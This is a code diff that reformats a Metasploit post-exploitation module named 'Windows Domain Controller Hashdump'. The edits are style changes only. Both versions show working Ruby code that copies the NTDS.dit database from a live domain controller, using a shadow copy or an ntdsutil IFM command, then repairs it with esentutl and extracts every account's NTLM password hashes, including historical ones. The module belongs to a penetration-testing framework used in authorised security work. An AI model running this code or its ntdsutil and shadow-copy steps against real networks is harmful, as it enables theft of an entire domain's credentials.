@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -15,20 +16,19 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::ShadowCopy
   include Msf::Post::File
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Windows Domain Controller Hashdump',
-      'Description'   => %q{
-        This module attempts to copy the NTDS.dit database from a live Domain Controller
-        and then parse out all of the User Accounts. It saves all of the captured password
-        hashes, including historical ones.
-  },
-      'License'       => MSF_LICENSE,
-      'Author'        => ['theLightCosine'],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-  ))
-    deregister_options('SMBUser','SMBPass', 'SMBDomain')
+                      'Name'          => 'Windows Domain Controller Hashdump',
+                      'Description'   => %q(
+                        This module attempts to copy the NTDS.dit database from a live Domain Controller
+                        and then parse out all of the User Accounts. It saves all of the captured password
+                        hashes, including historical ones.
+                  ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => ['theLightCosine'],
+                      'Platform'      => [ 'win' ],
+                      'SessionTypes'  => [ 'meterpreter' ]))
+    deregister_options('SMBUser', 'SMBPass', 'SMBDomain')
   end
 
   def run
@@ -45,7 +45,7 @@ class MetasploitModule < Msf::Post
           ad_account.nt_history.each_with_index do |nt_hash, index|
             hash_string = ad_account.lm_history[index] || Metasploit::Credential::NTLMHash::BLANK_LM_HASH
             hash_string << ":#{nt_hash}"
-            report_hash(hash_string.downcase,ad_account.name, realm)
+            report_hash(hash_string.downcase, ad_account.name, realm)
           end
         end
         rm_f(ntds_file)
@@ -56,13 +56,13 @@ class MetasploitModule < Msf::Post
   def copy_database_file
     database_file_path = nil
     if start_vss
-      case  sysinfo["OS"]
-        when /2003| \.NET/
-          database_file_path = vss_method
-        when /2008|2012/
-          database_file_path = ntdsutil_method
-        else
-          print_error "This version of Windows is unsupported"
+      case sysinfo["OS"]
+      when /2003| \.NET/
+        database_file_path = vss_method
+      when /2008|2012/
+        database_file_path = ntdsutil_method
+      else
+        print_error "This version of Windows is unsupported"
       end
     end
     database_file_path
@@ -77,13 +77,13 @@ class MetasploitModule < Msf::Post
   end
 
   def ntds_location
-    @ntds_location ||= registry_getvaldata("HKLM\\SYSTEM\\CurrentControlSet\\services\\NTDS\\Parameters\\","DSA Working Directory")
+    @ntds_location ||= registry_getvaldata("HKLM\\SYSTEM\\CurrentControlSet\\services\\NTDS\\Parameters\\", "DSA Working Directory")
   end
 
   def ntdsutil_method
-    tmp_path = "#{get_env("%WINDIR%")}\\Temp\\#{Rex::Text.rand_text_alpha((rand(8)+6))}"
+    tmp_path = "#{get_env('%WINDIR%')}\\Temp\\#{Rex::Text.rand_text_alpha((rand(8) + 6))}"
     command_arguments = "\"activate instance ntds\" \"ifm\" \"Create Full #{tmp_path}\" quit quit"
-    result = cmd_exec("ntdsutil.exe", command_arguments,90)
+    result = cmd_exec("ntdsutil.exe", command_arguments, 90)
     if result.include? "IFM media created successfully"
       file_path = "#{tmp_path}\\Active Directory\\ntds.dit"
       print_status "NTDS database copied to #{file_path}"
@@ -95,7 +95,6 @@ class MetasploitModule < Msf::Post
     file_path
   end
 
-
   def preconditions_met?
     unless is_admin?
       print_error "This module requires Admin privs to run"
@@ -105,13 +104,11 @@ class MetasploitModule < Msf::Post
       print_error "This does not appear to be an AD Domain Controller"
       return false
     end
-    unless session_compat?
-      return false
-    end
-    return true
+    return false unless session_compat?
+    true
   end
 
-  def repair_ntds(path='')
+  def repair_ntds(path = '')
     arguments = "/p /o \"#{path}\""
     cmd_exec("esentutl", arguments)
   end
@@ -120,7 +117,7 @@ class MetasploitModule < Msf::Post
     cred_details = {
       origin_type: :session,
       session_id: session_db_id,
-      post_reference_name: self.refname,
+      post_reference_name: refname,
       private_type: :ntlm_hash,
       private_data: ntlm_hash,
       username: username,
@@ -143,15 +140,14 @@ class MetasploitModule < Msf::Post
 
   def vss_method
     location = ntds_location.dup
-    volume = location.slice!(0,3)
-    id = create_shadowcopy("#{volume}")
+    volume = location.slice!(0, 3)
+    id = create_shadowcopy(volume.to_s)
     print_status "Getting Details of ShadowCopy #{id}"
     sc_details = get_sc_details(id)
     sc_path = "#{sc_details['DeviceObject']}\\#{location}\\ntds.dit"
-    target_path = "#{get_env("%WINDIR%")}\\Temp\\#{Rex::Text.rand_text_alpha((rand(8)+6))}"
+    target_path = "#{get_env('%WINDIR%')}\\Temp\\#{Rex::Text.rand_text_alpha((rand(8) + 6))}"
     print_status "Moving ntds.dit to #{target_path}"
     move_file(sc_path, target_path)
     target_path
   end
-
 end
